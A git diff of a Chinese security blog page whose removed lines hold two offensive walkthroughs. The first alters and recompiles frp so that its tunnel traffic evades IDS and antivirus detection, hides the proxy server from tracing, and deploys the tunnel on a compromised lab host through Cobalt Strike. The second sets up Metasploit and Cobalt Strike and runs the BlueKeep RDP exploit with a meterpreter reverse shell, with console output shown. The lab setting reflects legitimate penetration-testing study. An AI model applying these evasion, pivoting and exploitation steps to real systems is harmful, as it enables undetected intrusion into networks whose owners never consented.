-<h2><span id="改造前的流量">改造前的流量</span></h2><p>在frp默认配置文件 frpc.ini中不开启 tls_enable = true 时，客户端在连接服务端时会把版本信息传给服务端进行认证。下面是在连接时wires hark抓包的流量</p>
-<p><img src="/images/13/1.png" alt></p>
-<p>可以看见非常明显的frp流量特征</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token string">"version"</span><span class="token punctuation">,</span><span class="token string">"host name"</span><span class="token punctuation">,</span><span class="token string">"user"</span><span class="token punctuation">,</span><span class="token string">"arch"</span><span class="token punctuation">,</span><span class="token string">"privilege_key"</span><span class="token punctuation">,</span><span class="token string">"times tamp"</span><span class="token punctuation">,</span><span class="token string">"run id"</span><span class="token punctuation">,</span><span class="token string">"metas"</span><span class="token punctuation">,</span><span class="token string">"pool_count"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>这时候我们需要修改frp源码中的特征，并且使用Go环境重新编译</p>
-<p>源码地址：</p>
-<pre class="line-numbers language-python"><code class="language-python">https<span class="token punctuation">:</span><span class="token operator">//</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>fatedier<span class="token operator">/</span>frp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>特征认证信息处：</p>
-<pre class="line-numbers language-python"><code class="language-python"> pkg\msg\msg<span class="token punctuation">.</span>go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/13/2.png" alt></p>
-<p>可以将所有的变量加一个任意的前缀，比如Apple</p>
-<p><img src="/images/13/3.png" alt></p>
-<p>而在<code>pkg\util\version\version.go</code> 中定义了版本信息，这里也可以修改一下</p>
-<p><img src="/images/13/4.png" alt></p>
-<p>修改为3.14.15</p>
-<p><img src="/images/13/5.png" alt></p>
-<h2><span id="客户端连接">客户端连接</span></h2><p>如果按照正常的客户端连接方式，我们需要一个frpc.ini配置文件，这里会暴露我们的代理服务器，如果被溯源问题就大了。</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
-server_addr <span class="token operator">=</span> xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>xxx
-server_port <span class="token operator">=</span> <span class="token number">4444</span>
-privilege_token <span class="token operator">=</span> pentest
-tls_enable <span class="token operator">=</span> true
-
-<span class="token punctuation">[</span>ssh<span class="token punctuation">]</span>
-type <span class="token operator">=</span> tcp
-remote_port <span class="token operator">=</span> <span class="token number">23333</span>
-plugin <span class="token operator">=</span> socks5
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>所以我们在源码中添加一段自定义的代码，使其用接收参数的方式进行指定ip和端口。</p>
-<p>在<code>cmd\frpc\sub\root.go</code>文件中添加如下函数（具体配置需要自己更改）</p>
-<pre class="line-numbers language-python"><code class="language-python">func getFileContent<span class="token punctuation">(</span>ip string<span class="token punctuation">,</span>port string<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    var content string <span class="token operator">=</span> `<span class="token punctuation">[</span>common<span class="token punctuation">]</span>
-    server_addr <span class="token operator">=</span> ` <span class="token operator">+</span> ip <span class="token operator">+</span> `
-    server_port <span class="token operator">=</span> ` <span class="token operator">+</span> port <span class="token operator">+</span> `
-    tls_enable <span class="token operator">=</span> true
-
-    <span class="token punctuation">[</span>ssh<span class="token punctuation">]</span>
-    type <span class="token operator">=</span> tcp
-    remote_port <span class="token operator">=</span> <span class="token number">6000</span>
-    plugin <span class="token operator">=</span> socks5
-    `
-    fileContent <span class="token operator">=</span> content
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>同时别忘了对变量进行定义<br><img src="/images/13/6.png" alt></p>
-<p>在 init函数中加两行代码，对ip和端口进行接收。</p>
-<pre class="line-numbers language-python"><code class="language-python">rootCmd<span class="token punctuation">.</span>PersistentFlags<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>StringVarP<span class="token punctuation">(</span><span class="token operator">&amp;</span>ip<span class="token punctuation">,</span> <span class="token string">"server_addr"</span><span class="token punctuation">,</span> <span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"server_addr"</span><span class="token punctuation">)</span>
-rootCmd<span class="token punctuation">.</span>PersistentFlags<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>StringVarP<span class="token punctuation">(</span><span class="token operator">&amp;</span>port<span class="token punctuation">,</span> <span class="token string">"server_port"</span><span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"server_port"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/13/7.png" alt></p>
-<p>最后需要在 runClient()函数下调用我们自定义的函数getFileContent()<br><img src="/images/13/8.png" alt></p>
-<p>注意一下参数的接收和代码的注释。</p>
-<h2><span id="go环境搭建编译frp">Go环境搭建编译frp</span></h2><p>这里学弟搞得一键搭建QAQ，不过注意要在 /root/ 目录下运行该脚本</p>
-<pre class="line-numbers language-sh"><code class="language-sh">go_tar_gz="go1.15.5.linux-amd64.tar.gz"
-
-go_url="https://dl.google.com/go/${go_tar_gz}"
-
-wget --no-check-certificate -O ${go_tar_gz}  ${go_url}
-tar -xvf  ${go_tar_gz}
-rm  ${go_tar_gz}
-
-
-# go语言 添加环境变量
-
-cat <<eof>> ~/.profile
-export GOROOT=/root/go
-export GOPATH=/root/go/work
-export PATH=$PATH:/root/go/bin
-
-EOF
-
-source ~/.profile
-mkdir -p /root/go/work
-
-# 测试go语言安装
-
-mkdir -p ~/helloworld
-cd ~/helloworld
-
-cat <<eof> helloworld.go
-
-// Test that we can do page 1 of the C book.
-
-package main
-
-func main() {
-    print("hello, world\n")
-}
-EOF
-
-go build
-
-./helloworld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></eof></eof></code></pre>
-<p>我这里使用的kali安装的Go环境，使用<code>go version</code>检测是否成功<br><img src="/images/13/9.png" alt></p>
-<p>如果不成功可能是环境变量文件没有刷新，刷新一下就好了</p>
-<pre class="line-numbers language-python"><code class="language-python">source <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3><span id="编译">编译</span></h3><p>之后把修改过后的frp源码拖到 go/work/ 目录下，修改 Makefile.cross-compiles 文件，添加</p>
-<pre class="line-numbers language-python"><code class="language-python">export GOPROXY<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span>goproxy<span class="token punctuation">.</span>cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>之所以添加<code>export GOPROXY=https://goproxy.cn</code>是因为在国内，go语言的这个包的网站是被禁止的，我们无法直接访问。</p>
-<p>修改完成之后就可以对其进行编译了。</p>
-<pre class="line-numbers language-python"><code class="language-python">make <span class="token operator">-</span>f Makefile<span class="token punctuation">.</span>cross<span class="token operator">-</span>compiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>编译出的各种版本如下</p>
-<p><img src="/images/13/10.png" alt></p>
-<h2><span id="测试">测试</span></h2><h3><span id="环境">环境</span></h3><p>内网网段：<br>win7 192.168.111.2<br>kali 192.168.111.3 （有Web服务，仅内网访问）</p>
-<p>模拟公网网段：<br>win7 192.168.10.19（桥接）</p>
-<p>实验的时候需要把物理机中自定义的内网网段的网卡禁用掉。</p>
-<p>将编译后的frps_linux_386上传到公网VPS中，创建frps.ini文件，写入</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
-bind_port <span class="token operator">=</span> <span class="token number">9998</span>  <span class="token comment" spellcheck="true">#自定义与客户端要连接的端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>随后载入该配置文件启动</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>frps_linux_386 <span class="token operator">-</span>c frps<span class="token punctuation">.</span>ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/images/13/11.png" alt></p>
-<p>服务端已经成功启动，我们在靶机win7上传我们编译过后的frpc_windows_386.exe.<br><img src="/images/13/12.png" alt></p>
-<p>然后通过cmd命令行指定ip和端口进行连接。当然，上传之后直接在cs中执行shell命令也可。<br><img src="/images/13/13.png" alt></p>
-<p>在本地通过SocksCap64，Proxifier代理工具连接。<br><img src="/images/13/14.png" alt><br><img src="/images/13/15.png" alt></p>
-<p>连接成功，如果不使用代理服务器进行访问。<br><img src="/images/13/16.png" alt></p>
-<p>使用SocksCap64代理后进行访问<br><img src="/images/13/17.png" alt></p>
-<p>成功访问了内网kali的Web服务，ssh服务也可以连上。</p>
-<p>关闭进程</p>
-<pre class="line-numbers language-python"><code class="language-python">shell taskkill <span class="token operator">/</span>f <span class="token operator">/</span>t <span class="token operator">/</span>im frpc_windows_386<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3><span id="遗留问题">遗留问题</span></h3><p>虽然其他服务都能够正常的访问，但是却Ping不通，不知道是自己环境的问题还是ICMP协议通过代理后会有什么变化的问题。</p>
-<p>临时解决：<br>    虽然无法ping，但是可以直接通过CS拿下的机器进行信息收集等工作，感觉代理后Ping的通内网并不是刚需。</p>
-
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在拿下一台机器作为入口时，内网代理就变得尤为重要。他是我们进行横向渗透一个中间人，没了代理在内网中就寸步难行。而内网穿透的工具有很多，比如frp，reGeorg等等非常优秀的代理工具。使用方法不在赘述，这篇文章主要记录下在FRP内网代理时的流量改造。FRP作为一个开源的项目，它的特征早已被各大厂商掌握了，不进行流量上的改变我们就无法成功的建立连接，如果直接使用github编译后的EXE直接会被360等杀软直接判定为黑客行为，流量改造也是为了能够达到一定程度上的免杀效果。</p>
+    
+    <a class="article-more-a" href="/2020/11/30/13/#more">more >></a>
+    
     
 
     
@@ -1400,134 +1097,11 @@ bind_port <span class="token operator">=</span> <span class="token number">9998<
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1><span id="ubuntu-metasploit-cobaltstrike40">Ubuntu + Metasploit + CobaltStrike4.0</span></h1><p>内网渗透利器msf和cs是必不可少的，这两大利器的联动能达到更好的效果。所以就先从搭建属于自己的内网渗透平台开始做起。</p>
-<h2><span id="ubuntu-搭建">Ubuntu 搭建</span></h2><p>Ubuntu 18.04 <a href="http://mirrors.aliyun.com/ubuntu-releases/18.04/" target="_blank" rel="noopener">http://mirrors.aliyun.com/ubuntu-releases/18.04/</a><br>之后在VMware中创建之后启动起来，设置用户名密码完成。配置一下以下几点平时使用更方便：</p>
-<h3><span id="i-使用root登陆">Ⅰ 使用root登陆</span></h3><pre class="line-numbers language-python"><code class="language-python">sudo passwd root
-设置密码
-重复密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>使用root进行登录</p>
-<h3><span id="ii-安装ssh服务">Ⅱ 安装SSH服务</span></h3><pre class="line-numbers language-python"><code class="language-python">sudo apt install openssh<span class="token operator">-</span>server
-sudo service ssh start
-sudo apt install openssh<span class="token operator">-</span>client<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h3><span id="iii-ssh开启root登陆">Ⅲ SSH开启ROOT登陆</span></h3><pre class="line-numbers language-python"><code class="language-python">vim <span class="token operator">/</span>etc<span class="token operator">/</span>ssh<span class="token operator">/</span>sshd_config
-添加或修改 PermitRootLogin yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/12/1.png" alt></p>
-<p>最后SSH使用ROOT登陆<br><img src="/images/12/2.png" alt></p>
-<h2><span id="metasploit-搭建">Metasploit 搭建</span></h2><p>在根目录创建msf文件进入后执行</p>
-<pre class="line-numbers language-python"><code class="language-python">curl https<span class="token punctuation">:</span><span class="token operator">//</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com<span class="token operator">/</span>rapid7<span class="token operator">/</span>metasploit<span class="token operator">-</span>omnibus<span class="token operator">/</span>master<span class="token operator">/</span>config<span class="token operator">/</span>templates<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">-</span>wrappers<span class="token operator">/</span>msfupdate<span class="token punctuation">.</span>erb <span class="token operator">></span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> chmod <span class="token number">755</span> msfinstall <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">.</span><span class="token operator">/</span>msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>安装后<code>msfconsole</code>进入</p>
-<p><img src="/images/12/3.png" alt></p>
-<p>简单无脑，直接进入。</p>
-<h2><span id="cobaltstrike40-搭建">CobaltStrike4.0 搭建</span></h2><p>将CobaltStrike4.0.zip文件夹复制到/cs4/下后执行</p>
-<pre class="line-numbers language-python"><code class="language-python">unzip CobaltStrike4<span class="token number">.0</span><span class="token punctuation">.</span>zip
-cd CobaltStrike4<span class="token number">.0</span><span class="token operator">/</span>
-<span class="token punctuation">.</span><span class="token operator">/</span>teamserver <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.47</span> wlsmile123<span class="token punctuation">.</span><span class="token punctuation">.</span>
-
-<span class="token comment" spellcheck="true"># ./teamserver 本地IP 密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/12/4.png" alt></p>
-<p>在本地windows打cs客户端，输入用户名密码。</p>
-<p><img src="/images/12/5.png" alt></p>
-<p>连接。<br><img src="/images/12/6.png" alt></p>
-<h1><span id="小试牛刀-msf与cs互传shell">小试牛刀 msf与cs互传shell</span></h1><h2><span id="复现-cve_2019_0708_bluekeep_rce">复现 cve_2019_0708_bluekeep_rce</span></h2><p>靶机：192.168.27.46 win7<br>本机：192.168.27.47 Ubuntu</p>
-<p>启动msf后搜索0708</p>
-<pre class="line-numbers language-python"><code class="language-python">msf6 <span class="token operator">></span> search <span class="token number">0708</span>
-
-Matching Modules
-<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
-
-   <span class="token comment" spellcheck="true">#  Name                                             Disclosure Date  Rank    Check  Description</span>
-   <span class="token operator">-</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>                                             <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>    <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
-   <span class="token number">0</span>  auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep     <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       normal  Yes    CVE<span class="token number">-2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep Microsoft Remote Desktop RCE Check
-   <span class="token number">1</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>browser<span class="token operator">/</span>clear_quest_cqole        <span class="token number">2012</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">19</span>       normal  No     IBM Rational ClearQuest CQOle Remote Code Execution
-   <span class="token number">2</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>browser<span class="token operator">/</span>tumbleweed_filetransfer  <span class="token number">2008</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">07</span>       great   No     Tumbleweed FileTransfer vcst_eu<span class="token punctuation">.</span>dll ActiveX Control Buffer Overflow
-   <span class="token number">3</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce   <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       manual  Yes    CVE<span class="token number">-2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep RDP Remote Windows Kernel Use After Free
-
-
-Interact <span class="token keyword">with</span> a module by name <span class="token operator">or</span> index<span class="token punctuation">.</span> For example info <span class="token number">3</span><span class="token punctuation">,</span> use <span class="token number">3</span> <span class="token operator">or</span> use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce
-
-msf6 <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>进入cve_2019_0708_bluekeep_rce模块</p>
-<pre class="line-numbers language-python"><code class="language-python">msf6 <span class="token operator">></span> use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> No payload configured<span class="token punctuation">,</span> defaulting to windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">></span> options
-
-Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span><span class="token punctuation">:</span>
-
-   Name             Current Setting  Required  Description
-   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>             <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
-   RDP_CLIENT_IP    <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">0.100</span>    yes       The client IPv4 address to report during connect
-   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect<span class="token punctuation">,</span> UNSET <span class="token operator">=</span> random
-   RDP_DOMAIN                        no        The client domain name to report during connect
-   RDP_USER                          no        The username to report during connect<span class="token punctuation">,</span> UNSET <span class="token operator">=</span> random
-   RHOSTS                            yes       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> range CIDR identifier<span class="token punctuation">,</span> <span class="token operator">or</span> hosts file <span class="token keyword">with</span> syntax <span class="token string">'file:&lt;path>'</span>
-   RPORT            <span class="token number">3389</span>             yes       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
-
-
-Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span>
-
-   Name      Current Setting  Required  Description
-   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>      <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
-   EXITFUNC  thread           yes       Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>
-   LHOST     <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.47</span>    yes       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
-   LPORT     <span class="token number">4444</span>             yes       The listen port
-
-
-Exploit target<span class="token punctuation">:</span>
-
-   Id  Name
-   <span class="token operator">-</span><span class="token operator">-</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
-   <span class="token number">0</span>   Automatic targeting via fingerprinting<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>将require项填写</p>
-<pre class="line-numbers language-python"><code class="language-python">msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">></span> set rhosts <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span>
-rhosts <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.47</span>
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">></span> set target <span class="token number">1</span>
-target <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
-msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>执行拿shell</p>
-<pre class="line-numbers language-python"><code class="language-python">msf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">></span> exploit                                                               
-
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.47</span><span class="token punctuation">:</span><span class="token number">4444</span>                                                                        
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">3389</span> <span class="token operator">-</span> Using auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep <span class="token keyword">as</span> check                                         
-<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">3389</span>    <span class="token operator">-</span> The target <span class="token keyword">is</span> vulnerable<span class="token punctuation">.</span> The target attempted cleanup of the incorrectly<span class="token operator">-</span>bound MS_T120 channel<span class="token punctuation">.</span> 
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">3389</span>    <span class="token operator">-</span> Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>                                                             
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">3389</span> <span class="token operator">-</span> Using CHUNK grooming strategy<span class="token punctuation">.</span> Size 250MB<span class="token punctuation">,</span> target address <span class="token number">0xfffffa8013200000</span><span class="token punctuation">,</span> Channel count <span class="token number">1</span><span class="token punctuation">.</span>      
-<span class="token punctuation">[</span>!<span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">3389</span> <span class="token operator">-</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">|</span> Entering Danger Zone <span class="token operator">|</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>                                        
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">3389</span> <span class="token operator">-</span> Surfing channels <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                                                                
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">3389</span> <span class="token operator">-</span> Lobbing eggs <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                                                                    
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">3389</span> <span class="token operator">-</span> Forcing the USE of FREE'd object <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                                                
-<span class="token punctuation">[</span>!<span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span><span class="token punctuation">:</span><span class="token number">3389</span> <span class="token operator">-</span> <span class="token operator">&lt;</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">|</span> Leaving Danger Zone <span class="token operator">|</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>                                         
-<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">200262</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">27.46</span>                                                                            
